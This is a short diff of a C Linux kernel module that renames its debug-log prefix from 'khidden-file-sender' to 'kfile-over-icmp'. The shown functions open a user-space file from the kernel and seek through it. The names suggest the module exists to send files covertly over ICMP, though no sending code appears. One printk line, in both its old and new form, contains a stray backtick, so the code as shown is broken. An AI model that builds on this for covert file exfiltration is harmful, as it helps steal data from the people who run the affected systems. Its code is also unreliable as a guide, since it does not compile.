@@ -16,7 +16,7 @@ void initialize_file_metadata(struct file_metadata *current_file)
 
 void read_file_chunks(struct file_metadata *current_file)
 {
-    printk(KERN_DEBUG "khidden-file-sender: in read_file_chunks\n");
+    printk(KERN_DEBUG "kfile-over-icmp: in read_file_chunks\n");
 
     // open the file from user-space.
     // it is important to note that dealing with user-space files from the kernel is considered
@@ -26,7 +26,7 @@ void read_file_chunks(struct file_metadata *current_file)
     struct file *filp;
     filp = filp_open(current_file->file_path, O_RDONLY, 0);
     if (IS_ERR(filp)) {
-        printk(KERN_ERR "khidden-file-sender: failed to open file. error: %d\n", PTR_ERR(filp)`);
+        printk(KERN_ERR "kfile-over-icmp: failed to open file. error: %d\n", PTR_ERR(filp)`);
         return;
     }
     
@@ -34,7 +34,7 @@ void read_file_chunks(struct file_metadata *current_file)
     loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
     loff_t current_position = vfs_llseek(filp, 0, 0);
     if (0 != current_position) {
-        printk(KERN_ERR "khidden-file-sender: failed to seek back to file's beginning. file path: %s\n", current_file->file_path);
+        printk(KERN_ERR "kfile-over-icmp: failed to seek back to file's beginning. file path: %s\n", current_file->file_path);
         return;
     }
 
